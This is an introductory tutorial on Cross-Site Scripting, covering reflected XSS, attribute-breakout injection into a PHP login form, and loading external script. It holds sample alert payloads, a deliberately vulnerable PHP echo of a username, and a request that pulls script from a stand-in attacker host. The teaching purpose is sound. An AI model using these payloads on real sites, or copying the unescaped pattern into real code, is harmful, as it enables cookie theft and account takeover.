## Background
Cross-Site Scripting (XSS) arises when code incorporates user-supplied data into the response without adequately sanitizing it beforehand. Named for the capability it grants attackers to execute JavaScript on someone else's site, Cross-Site Scripting is commonly referred to as "XSS."

This vulnerability holds the #3 position on OWASP's list of Top 10 security threats and stands out as the most prevalent flaw in web application security.

Various methods enable hackers to inject JavaScript into a page, contingent on the output of unsanitized incoming data. Once the hacker successfully embeds their JavaScript within the page response, the script executes, typically unbeknownst to the unsuspecting user. The script can carry out a range of actions, including pilfering site cookies or session data. This exploit works because the browser inherently trusts all JavaScript provided with the page.

## Reflected Cross-Site Scripting (XSS) Vulnerability


Reflected Cross-Site Scripting (XSS) occurs when a script executes directly in the victim's browser. The JavaScript in question is typically embedded in the URL data or form data. The term "reflected" is used because the script rebounds immediately. In a carefully orchestrated attack, the user may not even detect that the script has executed.

```javascript
<h1>No results were found for: <script>alert('XSS!');</script></h1>
```
## XSS using an HTML attribute

Here's another illustration involving a login form. Take note that the username text input will be filled with the value of ``$username``, if available. In the event of a failed login attempt, the entered username will be retained in the form, allowing the user to make another attempt with a new password.

```javascript
<!-- login.php -->
<input type="text" name="username" value="<?php echo $username; ?>" /><br />
<input type="password" name="password" value="" />
```

A malicious actor inputs the subsequent username and password, then proceeds to submit the form.

```javascript
username: " /><script>alert('XSS!');</script>
password:
```
The login will fail and the form will be shown again with the hacker's code inserted.

```javascript
<!-- login.php -->
<input type="text" name="username" value="" /><script>alert('XSS!');</script>" />
<input type="password" name="password" value="" />
```
## XSS with External JavaScript

The JavaScript "payload" doesn't necessarily need to be straightforward or apparent. It is just as feasible to load an external JavaScript as it is to supply inline code. This JavaScript page may be extensive and intricate.

```javascript
GET /login.php?username=<script src="http://evilhacker.com/bad.js"></script>
```
